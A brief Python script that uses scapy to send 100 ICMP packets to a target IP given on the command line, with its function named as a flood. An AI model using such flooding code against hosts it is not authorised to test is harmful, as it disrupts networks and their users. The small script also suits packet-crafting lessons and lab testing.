from scapy.all import IP, ICMP, send
import sys

def icmp_flood(target_ip):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, count=100, verbose=True)
    return f"Sent 100 ICMP packets to {target_ip}"

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.10'
    print(icmp_flood(target))
